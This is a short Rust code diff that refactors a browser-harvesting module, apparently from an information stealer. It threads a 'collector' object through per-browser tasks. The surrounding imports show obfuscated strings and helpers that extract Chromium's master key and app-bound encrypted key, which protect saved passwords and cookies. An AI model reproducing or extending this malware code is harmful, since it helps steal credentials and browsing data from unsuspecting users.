@@ -18,10 +18,10 @@ use alloc::borrow::ToOwned;
 use alloc::string::String;
 use alloc::sync::Arc;
 use alloc::vec::Vec;
+use collector::atomic::AtomicCollector;
 use obfstr::obfstr as s;
 use tasks::{composite_task, CompositeTask, Task};
 use utils::browsers::chromium::{extract_app_bound_encrypted_key, extract_master_key};
-use utils::log_debug;
 use utils::path::Path;
 
 pub struct ChromiumTask<'a> {
@@ -108,10 +108,11 @@ fn is_in_profile_folder(path: &Path) -> bool {
 }
 
 impl Task for ChromiumTask<'_> {
-    unsafe fn run(&self, parent: &Path) {
+
+    unsafe fn run(&self, parent: &Path, collector: &AtomicCollector) {
         for (browser, task) in &self.tasks {
             let parent = parent / browser.name;
-            unsafe { task.run(&parent) }
+            unsafe { task.run(&parent, collector) }
         }
     }
 }
